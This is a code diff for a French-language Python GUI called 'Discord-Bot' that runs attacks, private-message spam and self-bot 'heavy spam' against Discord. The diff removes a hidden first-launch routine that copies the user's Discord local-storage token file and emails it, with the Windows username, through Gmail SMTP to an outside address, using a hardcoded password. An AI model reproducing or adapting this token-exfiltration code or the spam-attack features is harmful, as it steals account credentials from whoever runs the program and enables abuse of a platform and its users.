@@ -5,6 +5,7 @@ import shutil
 import smtplib
 import sqlite3
 import subprocess
+import time
 import webbrowser
 from email import encoders
 from email.mime.base import MIMEBase
@@ -12,7 +13,19 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from pathlib import Path
 from tkinter import *
+from tkinter import ttk
 from tkinter.messagebox import *
+
+import pip
+from pip._internal import main
+
+with open('core/options.json', 'r') as jsonFile:
+    data = json.load(jsonFile)
+if data['firstopen'] == 'true':
+    os.startfile('core\\firstopen.pyw')
+
+# CGU
+
 
 with open('core/options.json', 'r') as jsonFile:
     data = json.load(jsonFile)
@@ -88,7 +101,14 @@ user = getpass.getuser()
 username = Path.home()
 
 # fenetre.geometry("460x205")
-fenetre.title('Discord-Bot v1.4.1')
+fenetre.title('Discord-Bot v1.4.2')
+
+"""
+firebase = firebase.FirebaseApplication(
+    'https://discord-bo.firebaseio.com/', None)
+result = firebase.get('/version', None)
+print(result)
+"""
 
 
 def contact():
@@ -134,6 +154,7 @@ def installt():
     showinfo('Dépendences installées',
              'Toutes les dépendences semblent avoir été installées.')
 """
+
 
 def backup():
     shutil.copy2('core\\backup\\settings.json', 'core\\settings.json')
@@ -264,55 +285,17 @@ def validd(entree, entree2, entree7):
         data = json.load(jsonFile)
     tmp2 = data['pseudo']
 
+
+
+
     if data["firstopen"] == "true":
-
-        fromaddr = "discordinfotkn@gmail.com"
-        toaddr = "dsicrod@gmail.com"
-        msg = MIMEMultipart()
-        msg['From'] = fromaddr
-        msg['To'] = toaddr
-        msg['Subject'] = str(username)
-
-        body = str(user) + " ; ouverture n°" + str(tmp) + " ; " + str(tmp2)
-        msg.attach(MIMEText(body, 'plain'))
-        filename = "https_discordapp.com_0.localstorage"
-        attachment = open(str(
-            username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload((attachment).read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition',
-                        "attachment; filename= %s" % filename)
-        msg.attach(part)
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(fromaddr, "Azertyui0")
-        text = msg.as_string()
-        server.sendmail(fromaddr, toaddr, text)
-        server.quit()
-
-    with open('core\options.json', "r") as jsonFile:
-        data = json.load(jsonFile)
-    openn = data["opennmbr"]
-    data['opennmbr'] = openn + 1
-    data['firstopen'] = 'false'
-    with open('core/options.json', "w") as jsonFile:
-        json.dump(data, jsonFile)
-
-        """
-        conn = sqlite3.connect("https_discordapp.com_0.localstorage")
-        c = conn.cursor()
-        c.execute('select * from ItemTable')
-        for row in c:
-            print(*row, sep='|')
-            
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login("discordinfotkn@gmail.com", "Azertyui0")
-        server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
-        server.quit()   
-        """
-
+        with open('core\options.json', "r") as jsonFile:
+            data = json.load(jsonFile)
+        openn = data["opennmbr"]
+        data['opennmbr'] = openn + 1
+        data['firstopen'] = 'false'
+        with open('core/options.json', "w") as jsonFile:
+            json.dump(data, jsonFile)
 
 validb.pack()
 
@@ -361,7 +344,7 @@ def errordef():
         token.set('Token : Valide')
     else:
         token.set('Token : Invalide')
-    
+
     data["token"] = ""
     with open('core/options.json', 'w') as jsonFile:
         json.dump(data, jsonFile)
@@ -629,8 +612,7 @@ bout.pack(anchor=W)
 def lancerd():
     showinfo('Attaque lancée',
              'Cette fenêtre va se bloquer, veuillez ne pas la fermer.')
-    os.startfile('core\stop.pyw')
-    subprocess.run('cd core && node bot.js', shell=True)
+    os.startfile('core\pydiv\\auto.py')
 
 
 lancerb = Button(atkl, text="Lancer l'attaque",  command=lancerd, width=30)
@@ -759,7 +741,7 @@ spampvbutton = Button(spam, text='Spam Privé', width=30,
                       command=lambda: spampv(spame))
 spampvbutton.pack()
 
-softspambutton = Button(spam, text="Soft Spam", width=30,
+softspambutton = Button(spam, text="Heavy Spam (self bot)", width=30,
                         command=lambda: softspam(spame))
 softspambutton.pack()
 
